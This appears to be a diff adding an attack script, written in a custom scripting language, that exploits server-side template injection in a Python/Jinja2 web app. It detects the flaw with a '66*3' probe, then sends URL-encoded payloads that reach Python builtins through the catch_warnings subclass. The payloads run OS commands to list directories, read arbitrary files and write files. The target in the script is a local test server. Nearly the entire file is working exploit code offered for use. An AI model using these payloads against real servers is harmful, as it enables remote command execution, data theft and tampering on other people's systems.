@@ -1,0 +1,45 @@
+#define pd = {%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__==%27catch_warnings%27%20%}{{66*3}}{{%20c.__init__.__globals__[%27__builtins__%27].eval(%22__import__(%27os%27).popen(%27echo%20Wker%27).read()%22)%20}}{%%20endif%20%}{%%20endfor%20%}
+#define dir = {%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__==%27catch_warnings%27%20%}{{%20c.__init__.__globals__[%27__builtins__%27].eval(%22__import__(%27os%27).popen(%27echo%20Wker666%27).read()%22)%20}}{{%20c.__init__.__globals__[%27__builtins__%27].eval(%22__import__(%27os%27).popen(%27dir%20mulu%20/b%27).read()%22)%20}}{{%20c.__init__.__globals__[%27__builtins__%27].eval(%22__import__(%27os%27).popen(%27echo%20Wker666%27).read()%22)%20}}{%%20endif%20%}{%%20endfor%20%}
+#define read = {%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__==%27catch_warnings%27%20%}{{%20c.__init__.__globals__[%27__builtins__%27].eval(%22__import__(%27os%27).popen(%27echo%20Wker666%27).read()%22)%20}}{{%20c.__init__.__globals__[%27__builtins__%27].open(%27mulu%27,%20%27r%27).read()%20}}{{%20c.__init__.__globals__[%27__builtins__%27].eval(%22__import__(%27os%27).popen(%27echo%20Wker666%27).read()%22)%20}}{%%20endif%20%}{%%20endfor%20%}
+#define write = {%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__==%27catch_warnings%27%20%}{{%20c.__init__.__globals__[%27__builtins__%27].open(%27mulu%27,%20%27w%27).write(%27neirong%27)%20}}{%%20endif%20%}{%%20endfor%20%}
+function dir(url,path){
+	res = HttpGet(url.StrReplace(dir,"mulu",StrReplace(path,"\\","\\\\")),"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0");
+	d = GettextMiddle(res[0],"Wker666","Wker666");
+	list = StrSplit(d,StrRN());
+	i = 0;
+	num = GetArrayNum(list);
+	while(i < num){
+		if(list[i] != ""){
+			print(list[i]);
+		}
+		i = ToInt(i+1);
+	}
+	return 0;
+}
+function Read(url,path){
+	res = HttpGet(url.StrReplace(read,"mulu",StrReplace(path,"\\","\\\\")),"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0");
+	d = GettextMiddle(res[0],"Wker666","Wker666");
+	print(d);
+	return 0;
+}
+function Write(url,path,content){
+	res = HttpGet(url.StrReplace(StrReplace(write,"mulu",StrReplace(path,"\\","\\\\")),"neirong",content),"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0");
+	print("写入完毕");
+	return 0;
+}
+function judgeSSTI(url){
+	res = HttpGet(url.pd,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0");
+	if(StrFindStr(res[0],"198Wker",0) != "-1"){
+		return 1;
+	}
+	return 0;
+}
+function main(args){
+	url = "http://127.0.0.1:5000/?name=";
+	if(judgeSSTI(url) == 1){
+		print("恭喜,存在SSTI注入");
+		dir(url,"C:\");
+		Read(url,"ts.py");
+		Write(url,"D:/a.txt","123");
+	}
+}
